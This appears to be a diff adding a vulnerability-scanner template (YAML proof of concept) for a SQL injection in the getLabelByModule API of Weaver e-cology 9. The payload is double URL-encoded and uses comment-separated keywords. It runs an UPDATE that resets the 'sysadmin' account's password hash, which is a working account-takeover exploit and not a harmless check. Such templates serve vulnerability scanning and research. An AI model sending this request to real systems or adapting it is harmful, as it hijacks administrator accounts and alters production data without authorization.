@@ -1,0 +1,15 @@
+name: ecology9-getLabelByModule-sql-injection
+transport: http
+set:
+  r1: urlencode(urlencode("s');update/**/HrmResourceManager/**/set/**/password=UPPER('2DE8C18F8A2E60C3B096370AE9812915')/**/where/**/loginid='sysadmin'/**/and/**/'1'=('1"))
+rules:
+  r0:
+    request:
+      method: GET
+      path: /api/ec/dev/locale/getLabelByModule?moduleCode={{r1}}
+    expression: response.status == 200
+expression: r0()
+detail:
+  author: trganda
+  links:
+    - https://www.weaver.com.cn/cs/securityDownload.asp
